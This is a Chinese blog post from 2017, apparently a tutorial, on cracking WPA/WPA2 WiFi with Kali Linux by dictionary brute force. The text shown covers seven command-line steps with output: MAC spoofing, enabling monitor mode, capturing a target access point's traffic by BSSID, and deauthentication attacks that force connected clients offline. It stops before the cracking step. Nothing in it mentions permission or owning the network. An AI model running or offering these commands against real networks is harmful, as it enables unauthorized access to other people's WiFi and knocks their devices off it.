---
title:  "<font color='red'>[原创]</font> 使用Kali破解WPA/WPA2 WiFi"
date:   2017-09-26 15:13:23
categories: [原创,技术宅,Kali]
tags: [原创,技术宅,Kali]
---

**

## 使用密码表暴力破解

1. 检查无线适配器状态
		
		# iwconfig
		wlan0	IEEE 802.11  ESSID:off/any  
          		Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          		Retry short  long limit:2   RTS thr:off   Fragment thr:off
          		Encryption key:off
          		Power Management:off

2. [可选] 对于运行在virtual box中的虚拟机，需要执行以下命令

		# airmon-ng stop wlan0mon && ifconfig wlan0 down && macchanger -r wlan0 && airmon-ng check kill && ifconfig wlan0 up

3. kill掉可能会造成monitor模式错误的进程

		# airmon-ng check kill
		Killing these processes:
		  PID Name
		  563 dhclient
		  841 wpa_supplicant

4. 在wlan0开始monitor模式

		# airmon-ng start wlan0
		PHY		Interface	Driver		Chipset
		phy0	wlan0		rt2800usb	Ralink Technology, Corp. RT5372
		(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
		(mac80211 station mode vif disabled for [phy0]wlan0)

5. 查看周围的AP和连接上AP的clients，保留运行这个命令的终端

		# airodump-ng wlan0mon

6. 新开一个终端，监听特定频段和SSID的AP

		# airodump-ng -c 11 --bssid 70:F9:6D:64:B5:60 -w ~/test wlan0mon

7. 将连上该AP的clients强制下线
		
		# aireplay-ng --deauth 10 -a 70:F9:6D:64:B5:60 wlan0mon
